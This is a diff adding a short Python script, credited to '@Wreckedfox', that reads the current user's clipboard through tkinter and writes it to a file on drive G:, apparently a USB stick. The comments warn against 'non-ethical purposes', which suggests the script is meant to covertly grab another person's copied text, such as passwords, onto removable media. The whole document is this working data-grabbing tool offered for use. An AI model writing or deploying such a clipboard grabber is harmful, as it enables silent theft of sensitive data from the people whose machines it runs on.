@@ -1,0 +1,24 @@
+import tkinter
+import os
+
+#This Script was originally made from me aka @Wreckedfox     <3
+
+#This Python Script Copys The Current Users Clipboard aka What They Recently Clicked 'Copy' On, Then pastes what was on the clipboard to Clipboard_data.txt
+
+#Please Don't Use This Script For Non-Ethical Purposes (:
+
+#Getting Clipboard Data and Assigning It The Variable 'clipboard'
+clipboard = tkinter.Tk().clipboard_get()
+
+#Changing Directory to USB Drive
+os.chdir('G:')
+
+#Creating A Funtion To Make the File And Overrite  Things Previously In The File.
+def Create_File():
+    cp_data = open('clipboard_data.txt','w')
+    cp_data.write(clipboard)
+    cp_data.close()
+
+
+#Running the function Just Created
+Create_File()
